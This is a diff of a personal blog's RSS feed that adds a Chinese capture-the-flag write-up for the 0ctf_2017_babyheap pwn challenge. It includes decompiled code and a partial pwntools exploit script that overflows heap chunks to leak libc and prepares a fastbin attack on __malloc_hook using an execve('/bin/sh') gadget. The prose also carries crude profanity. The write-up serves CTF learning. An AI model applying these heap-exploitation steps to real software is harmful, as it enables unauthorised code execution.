@@ -1,4 +1,285 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>手撕ycb pwn 01</title><link>https://dxfaker.top/posts/ycbpwn1/</link><guid isPermaLink="true">https://dxfaker.top/posts/ycbpwn1/</guid><description>nmsl</description><pubDate>Tue, 27 Oct 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>第一个fastbin_attack的题</title><link>https://dxfaker.top/posts/fastbin_atk/</link><guid isPermaLink="true">https://dxfaker.top/posts/fastbin_atk/</guid><description>啊啊啊啊啊啊啊啊啊啊啊啊这个爱弥斯好好看啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊</description><pubDate>Thu, 29 Oct 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;这个是遇到的第一个用fastbin attack的题&lt;/p&gt;
+&lt;p&gt;因为没学过，还是狠狠的恶补了一下&lt;/p&gt;
+&lt;h1&gt;0ctf_2017_babyheap&lt;/h1&gt;
+&lt;p&gt;wsl指令下载glibc2.23&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# 1. 克隆工具
+git clone https://github.com/matrix1001/glibc-all-in-one.git
+cd glibc-all-in-one
+
+# 2. 给脚本执行权限
+chmod a+x build download extract update_list
+
+# 3. 更新可用列表
+./update_list
+
+# 4. 查找 2.23 的 amd64 包名（按你的题选，一般选 ubuntu 版本）
+cat list | grep 2.23
+
+# 5. 下载（以 2.23-0ubuntu11.3_amd64 为例，按上一步实际列表里的名字填）
+./download 2.23-0ubuntu11.3_amd64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  __int64 v4; // [rsp+8h] [rbp-8h]
+
+  v4 = sub_B70(a1, a2, a3);
+  while ( 1 )
+  {
+    menu();
+    switch ( read_input() )
+    {
+      case 1LL:
+        add(v4);
+        break;
+      case 2LL:
+        edit(v4);                               // the length you want
+        break;
+      case 3LL:
+        delete(v4);                             // no uaf
+        break;
+      case 4LL:
+        dump(v4);
+        break;
+      case 5LL:
+        return 0;
+      default:
+        continue;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;版本是2.23&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void __fastcall add(__int64 a1)
+{
+  int i; // [rsp+10h] [rbp-10h]
+  int input; // [rsp+14h] [rbp-Ch]
+  void *v3; // [rsp+18h] [rbp-8h]
+
+  for ( i = 0; i &amp;lt;= 15; ++i )
+  {
+    if ( !*(_DWORD *)(24LL * i + a1) )
+    {
+      printf(&quot;Size: &quot;);
+      input = read_input();
+      if ( input &amp;gt; 0 )
+      {
+        if ( input &amp;gt; 4096 )
+          input = 4096;
+        v3 = calloc(input, 1u);
+        if ( !v3 )
+          exit(-1);
+        *(_DWORD *)(24LL * i + a1) = 1;
+        *(_QWORD *)(a1 + 24LL * i + 8) = input;
+        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
+        printf(&quot;Allocate Index %d\n&quot;, i);
+      }
+      return;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;常规add，非bss管理&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall edit(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+18h] [rbp-8h]
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  printf(&quot;Index: &quot;);
+  result = read_input();
+  v2 = result;
+  if ( (unsigned int)result &amp;lt; 0x10 )
+  {
+    result = *(unsigned int *)(24LL * (int)result + a1);
+    if ( (_DWORD)result == 1 )
+    {
+      printf(&quot;Size: &quot;);
+      result = read_input();                    // 依旧不限长度改
+      v3 = result;
+      if ( (int)result &amp;gt; 0 )
+      {
+        printf(&quot;Content: &quot;);
+        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
+      }
+    }
+  }
+  return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ checksec pwn_patched
+[*] &apos;/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap/pwn_patched&apos;
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b&apos;.&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;delete&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall delete(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf(&quot;Index: &quot;);
+  result = read_input();
+  v2 = result;
+  if ( (unsigned int)result &amp;lt; 0x10 )
+  {
+    result = *(unsigned int *)(24LL * (int)result + a1);
+    if ( (_DWORD)result == 1 )
+    {
+      *(_DWORD *)(24LL * v2 + a1) = 0;
+      *(_QWORD *)(24LL * v2 + a1 + 8) = 0;
+      free(*(void **)(24LL * v2 + a1 + 16));
+      result = 24LL * v2 + a1;
+      *(_QWORD *)(result + 16) = 0;
+    }
+  }
+  return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;free(*(void **)(24LL * v2 + a1 + 16));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;传入的只有一个指针&lt;/p&gt;
+&lt;p&gt;也就是根据chunk头自己的大小进行free&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall dump(__int64 a1)
+{
+  int result; // eax
+  int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf(&quot;Index: &quot;);
+  result = read_input();
+  v2 = result;
+  if ( (unsigned int)result &amp;lt; 0x10 )
+  {
+    result = *(_DWORD *)(24LL * result + a1);
+    if ( result == 1 )
+    {
+      puts(&quot;Content: &quot;);
+      write_heap(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
+      return puts(byte_14F1);
+    }
+  }
+  return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;dump展示的是整个chunk&lt;/p&gt;
+&lt;p&gt;看到的检查，就先考虑把libc给泄露出来，然后进行fastbin attack，考虑改写__malloc_hook以及free_hook&lt;/p&gt;
+&lt;p&gt;那么我们要怎么才能把libc泄露出来呢&lt;/p&gt;
+&lt;p&gt;与leyi的解法不一样,我的见识比较浅薄，故优先考虑我知道的unsorted bin中fd/bk指向main_arena + offset,然后找个机会打印出来就好了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://dxfaker.top/images/post/9a9762bde9260a3cdd723ae67aa23935.jpg&quot; alt=&quot;9a9762bde9260a3cdd723ae67aa23935&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;泄露的一图流&lt;/p&gt;
+&lt;p&gt;通过不限长度改进行改写，然后在free的时候就会带着实际掌控的堆块进入unsorted bin&lt;/p&gt;
+&lt;p&gt;再进行一次calloc的时候会把1给所谓切走,然后把指向main_arena + offset的2给dump出来，加以计算便可以得到libc基址&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;debug&apos;)
+context.terminal = [&apos;cmd.exe&apos;, &apos;/c&apos;, &apos;start&apos;, &apos;wsl.exe&apos;, &apos;bash&apos;, &apos;-c&apos;]
+
+exe = ELF(&quot;./pwn_patched&quot;)
+context.binary = exe
+p =  remote(&quot;ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com&quot;, 9999, ssl=True, sni=&quot;ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com&quot;)
+# p =  process(&quot;./pwn_patched&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+def add_chunk(size):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;1&apos;)
+    p.recvuntil(b&apos;Size: &apos;)
+    p.sendline(str(size).encode())
+    
+def edit_chunk(idx, size, content):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;2&apos;)
+    p.recvuntil(b&apos;Index: &apos;)
+    p.sendline(str(idx).encode())
+    p.recvuntil(b&apos;Size: &apos;)
+    p.sendline(str(size).encode())
+    p.recvuntil(b&apos;Content: &apos;)
+    p.send(content)
+    
+def free_chunk(idx):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;3&apos;)
+    p.recvuntil(b&apos;Index: &apos;)
+    p.sendline(str(idx).encode())
+    
+def show_content(idx):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;4&apos;)
+    p.recvuntil(b&apos;Index: &apos;)
+    p.sendline(str(idx).encode())
+    
+
+
+fake_chunk = flat({
+            0x100: 0x110,
+            0x108: 0x221,}, filler = &apos;\x00&apos;)
+            
+            
+add_chunk(256)
+add_chunk(256)
+add_chunk(256)
+add_chunk(256)
+edit_chunk(0, len(fake_chunk), fake_chunk)
+# gdb.attach(p)
+free_chunk(1)
+add_chunk(256)
+show_content(2)
+# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E &apos; __free_hook$| __malloc_hook$| __realloc_hook$| system$&apos;
+# 5654: 00000000000453a0    45 FUNC    WEAK   DEFAULT   13 system
+# 6241: 00000000003c4b10     8 OBJECT  WEAK   DEFAULT   33 __malloc_hook
+# 6248: 00000000003c67a8     8 OBJECT  WEAK   DEFAULT   34 __free_hook
+# 7294: 00000000003c4b08     8 OBJECT  WEAK   DEFAULT   33 __realloc_hook
+# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E &apos;main_arena&apos;
+   # 915: 00000000003c4b20  2192 OBJECT  LOCAL  DEFAULT   33 main_arena
+   # (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ one_gadget ./libc.so.6
+# 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+p.recvuntil(b&apos;Content: &apos;)   # 吃掉 &quot;Content: &quot;
+p.recv(1)                   # 吃掉那个 &apos;\n&apos;
+leak = u64(p.recv(8).ljust(8, b&apos;\x00&apos;))
+libc.address = leak - 88 - 0x3c4b20
+system_add = libc.address + 0x453a0
+free_hook  = libc.address + 0x3c67a8 
+malloc_hook = 0x3c4b10 + libc.address
+fake_chunk_addr = malloc_hook - 0x23 
+fb_freehook = free_hook - 0x18
+bk_freehook = free_hook - 0x10
+# one_gadget = libc.address + 0x4527a  我草死你的吗
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;你可以看到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[DEBUG] Received 0x140 bytes:
+    00000000  43 6f 6e 74  65 6e 74 3a  20 0a 78 fb  cf b9 b2 7f  │Cont│ent:│ ·x·│····│
+    00000010  00 00 78 fb  cf b9 b2 7f  00 00 00 00  00 00 00 00  │··x·│····│····│····│
+    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000100  00 00 00 00  00 00 00 00  00 00 0a 31  2e 20 41 6c  │····│····│···1│. Al│
+    00000110  6c 6f 63 61  74 65 0a 32  2e 20 46 69  6c 6c 0a 33  │loca│te·2│. Fi│ll·3│
+    00000120  2e 20 46 72  65 65 0a 34  2e 20 44 75  6d 70 0a 35  │. Fr│ee·4│. Du│mp·5│
+    00000130  2e 20 45 78  69 74 0a 43  6f 6d 6d 61  6e 64 3a 20  │. Ex│it·C│omma│nd: │
+    00000140
+Content:
+x\xfbϹ\xb2\x7f\x00\x00x\xfbϹ\xb2\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command: $
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;泄露出来libc基址之后我我们要怎么操作呢&lt;/p&gt;
+&lt;p&gt;我们考虑一种经典的fastbin attack&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://dxfaker.top/images/post/Screenshot_20261029_162454_com.microsoft.office...jpg&quot; alt=&quot;Screenshot_20261029_162454_com.microsoft.office..&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;更改已经free掉的堆块上的指针&lt;/p&gt;
+&lt;p&gt;然后再申请两次，就申请到目标地址附近的地址，以此为fake chunk，然后再传onegadget布置好了，再进行add就可以触发了，但这样做也只是本地拿到了shell&lt;/p&gt;
+&lt;p&gt;那么问题出在哪里呢&lt;/p&gt;
+&lt;p&gt;题目的libc.so.6跟你下载的真的一样吗&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://dxfaker.top/images/post/4aab05c577ec3139f277fd3ca68c6d95.png&quot; alt=&quot;4aab05c577ec3139f277fd3ca68c6d95&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>手撕ycb pwn 01</title><link>https://dxfaker.top/posts/ycbpwn1/</link><guid isPermaLink="true">https://dxfaker.top/posts/ycbpwn1/</guid><description>nmsl</description><pubDate>Tue, 27 Oct 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
 &lt;p&gt;你要问我为什么先出的是ycb的wp而不是aurora26 ctf的，我只能说我把ycb这个贵物题写出来比pwn ak了还几把爽&lt;/p&gt;
 &lt;h1&gt;正文&lt;/h1&gt;
 &lt;p&gt;首先ycb尼玛死了，然后尼玛死了&lt;/p&gt;
